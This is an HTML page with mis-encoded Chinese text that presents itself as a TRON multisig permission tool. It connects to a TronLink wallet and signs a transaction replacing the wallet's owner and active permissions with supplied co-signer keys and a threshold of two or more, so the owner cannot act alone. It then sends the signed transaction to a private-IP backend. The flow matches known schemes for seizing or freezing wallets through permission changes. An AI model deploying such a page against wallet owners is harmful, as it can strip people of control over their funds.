<!DOCTYPE html>
<html>
<head>
    <title>TRON å¤šç­¾è®¾ç½®å·¥å…·</title>
    <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; border: 1px solid #ccc; border-radius: 8px; }
        h1 { text-align: center; color: #000; }
        label { display: block; margin-top: 15px; font-weight: bold; }
        input[type="text"], input[type="number"], textarea {
            width: 100%; padding: 10px; margin-top: 5px;
            border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;
        }
        button {
            background-color: #ff0000; color: white;
            padding: 15px 20px; border: none;
            border-radius: 4px; cursor: pointer;
            width: 100%; margin-top: 20px; font-size: 16px;
        }
        button:hover { background-color: #cc0000; }
        .hint { font-size: 0.9em; color: #666; margin-top: 5px; }
        .warning { color: red; font-weight: bold; margin-top: 10px; }
        #connectStatus { text-align:center; font-size:14px; margin-top:20px; color:#555; }
    </style>
</head>
<body>
    <h1>TRON å¤šç­¾æƒé™è®¾ç½®</h1>
    <p class="warning">âš ï¸ è®¾ç½®å¤šç­¾åéœ€è¦å¤šä¸ªåœ°å€å…±åŒç­¾åæ‰èƒ½ç®¡ç†è´¦æˆ·æƒé™æˆ–æ‰§è¡Œè½¬è´¦ï¼</p>

    <div id="connectStatus">â³ æ­£åœ¨æ£€æµ‹é’±åŒ…ç¯å¢ƒ...</div>

    <form id="multisigForm">
        <label for="coSigners">å…±åŒç­¾åè€…åœ°å€ (æ¯è¡Œä¸€ä¸ª TRON åœ°å€):</label>
        <textarea id="coSigners" rows="4" placeholder="ä¾‹å¦‚ï¼š
TMuPuzkAmgCQQopGXif8Hx47a6JbJQj6RM
TUP33QqAE5vJJsZZknP2FCWj58cstdz5W7"></textarea>
        <div class="hint">è¿™äº›åœ°å€ä¼šå’Œæ‚¨çš„å½“å‰é’±åŒ…ä¸€èµ·æˆä¸ºå¤šç­¾æˆå‘˜ã€‚</div>

        <label for="threshold">å¿…éœ€ç­¾åæ•°é‡ (Threshold):</label>
        <input type="number" id="threshold" min="2" value="2">
        <div class="hint">ä¾‹å¦‚ï¼š4 äººé’±åŒ…è®¾ä¸º 3ï¼Œè¡¨ç¤ºéœ€è¦ 3 äººä»¥ä¸ŠåŒæ„æ‰èƒ½æ“ä½œã€‚</div>

        <button type="submit" id="setPermissions">è®¾ç½®å¤šç­¾æƒé™</button>
    </form>

<script>

    /*******************************************************
     * â‘  ç­‰å¾… TronLink Mobile æˆ– PC æ³¨å…¥ tronWeb
     *******************************************************/
    async function waitForTronWeb() {
        return new Promise(resolve => {
            let attempts = 0;

            const check = setInterval(() => {
                attempts++;

                // æ‰‹æœº TronLink / PC æ’ä»¶éƒ½æ³¨å…¥ tronWeb
                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                    clearInterval(check);
                    resolve(window.tronWeb);
                }

                // PC æ’ä»¶çš„æ³¨å…¥äº‹ä»¶
                if (window.tronLink && window.tronLink.ready) {
                    clearInterval(check);
                    resolve(window.tronWeb);
                }

                // æœ€å¤šç­‰å¾… 10 ç§’
                if (attempts > 40) {
                    clearInterval(check);
                    resolve(null);
                }
            }, 250);
        });
    }

    /*******************************************************
     * â‘¡ åˆå§‹åŒ– â€” è‡ªåŠ¨æ£€æµ‹å¹¶æ˜¾ç¤ºé’±åŒ…è¿æ¥çŠ¶æ€
     *******************************************************/
    async function initWallet() {
        const status = document.getElementById("connectStatus");

        status.innerText = "â³ ç­‰å¾…é’±åŒ…æ³¨å…¥...";

        const tronWeb = await waitForTronWeb();

        if (!tronWeb) {
            status.innerText = "âŒ æœªæ£€æµ‹åˆ°é’±åŒ…ï¼Œè¯·åœ¨ TronLink æ‰‹æœºé’±åŒ…å†…ç½®æµè§ˆå™¨æ‰“å¼€æ­¤é¡µé¢ã€‚";
            return null;
        }

        const addr = tronWeb.defaultAddress.base58;

        if (!addr) {
            status.innerText = "âš ï¸ è¯·åœ¨é’±åŒ…ä¸­ç™»å½•è´¦æˆ·ã€‚";
            return null;
        }

        status.innerText = "âœ… å·²è¿æ¥é’±åŒ…ï¼š" + addr;
        return tronWeb;
    }


    let cachedTronWeb = null;

    window.addEventListener("load", async () => {
        cachedTronWeb = await initWallet();
    });


    /*******************************************************
     * â‘¢ ç”¨æˆ·ç‚¹å‡»â€œè®¾ç½®å¤šç­¾â€å¼€å§‹æ“ä½œ
     *******************************************************/
    document.getElementById("multisigForm").onsubmit = async (event) => {
        event.preventDefault();

        // å¿…é¡»å·²è¿æ¥é’±åŒ…
        const tronWeb = cachedTronWeb || await initWallet();
        if (!tronWeb) return;

        const currentWallet = tronWeb.defaultAddress.base58;
        if (!currentWallet) {
            alert("è¯·åœ¨ TronLink é’±åŒ…ä¸­ç™»å½•è´¦æˆ·å†ç»§ç»­ã€‚");
            return;
        }

        console.log("å½“å‰é’±åŒ…åœ°å€:", currentWallet);

        /*******************************************************
         * â‘£ è¯»å–ç”¨æˆ·è¾“å…¥
         *******************************************************/
        const raw = document.getElementById("coSigners").value.trim();
        const threshold = parseInt(document.getElementById("threshold").value);

        // å¤„ç†è¾“å…¥åœ°å€ï¼ˆè¿‡æ»¤éæ³•åœ°å€ï¼‰
        const inputAddresses = raw
            .split("\n")
            .map(a => a.trim())
            .filter(a => tronWeb.isAddress(a));

        // è‡ªåŠ¨å°†å½“å‰é’±åŒ…åŠ å…¥å¤šç­¾æˆå‘˜
        const allMembers = Array.from(new Set([currentWallet, ...inputAddresses]));
        const membersCount = allMembers.length;

        if (membersCount < 2) {
            alert("è‡³å°‘éœ€è¦ 2 ä¸ªæˆå‘˜ï¼ˆæ‚¨è‡ªå·± + è‡³å°‘ 1 ä¸ªå…¶ä»–åœ°å€ï¼‰ã€‚");
            return;
        }

        if (threshold < 2 || threshold > membersCount) {
            alert(`é˜ˆå€¼å¿…é¡»åœ¨ 2 åˆ° ${membersCount} ä¹‹é—´ã€‚`);
            return;
        }

        /*******************************************************
         * â‘¤ æ„å»ºæƒé™åˆ—è¡¨
         *******************************************************/
        const allKeys = allMembers.map(addr => ({
            address: tronWeb.address.toHex(addr),
            weight: 1
        }));

        const permissionConfig = {
            owner_address: currentWallet,

            owner: {
                type: 0,
                permission_name: "owner",
                threshold: threshold,
                keys: allKeys
            },

            actives: [{
                type: 2,
                permission_name: "active0",
                threshold: threshold,
                operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
                keys: allKeys
            }]
        };

        /*******************************************************
         * â‘¥ æ„å»ºå¤šç­¾æƒé™äº¤æ˜“
         *******************************************************/
        let transaction;
        try {
            transaction = await tronWeb.transactionBuilder.updateAccountPermissions(
                permissionConfig,
                currentWallet
            );
        } catch (err) {
            console.error(err);
            alert("æ„å»ºäº¤æ˜“å¤±è´¥ï¼š" + err.message);
            return;
        }

        if (!transaction) {
            alert("äº¤æ˜“æ„å»ºå¤±è´¥ï¼Œè¯·é‡è¯•ã€‚");
            return;
        }

        /*******************************************************
         * â‘¦ ç”¨æˆ·ç­¾åï¼ˆé’±åŒ…è‡ªåŠ¨å¼¹çª—ï¼‰
         *******************************************************/
        let signed;
        try {
            signed = await tronWeb.trx.sign(transaction);
        } catch (err) {
            console.error(err);
            alert("ç”¨æˆ·å–æ¶ˆç­¾åæˆ–ç­¾åå¤±è´¥ï¼š" + err.message);
            return;
        }

        /*******************************************************
         * â‘§ å‘é€åˆ°åç«¯ï¼ˆä½ çš„ä»£ä»˜å¹¿æ’­æœåŠ¡ï¼‰
         *******************************************************/
        const API_ENDPOINT = "http://192.168.110.214:3000/api/broadcast-tx";

        const response = await fetch(API_ENDPOINT, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                signedTransaction: signed,
                userWallet: currentWallet
            })
        });

        const result = await response.json();

        if (response.ok && result.success) {
            alert(`ğŸ‰ å¤šç­¾æƒé™è®¾ç½®å·²æäº¤ï¼äº¤æ˜“ ID: ${result.txid}`);
        } else {
            alert("âŒ å¹¿æ’­å¤±è´¥ï¼š" + result.message);
        }
    };

</script>

</body>
</html>
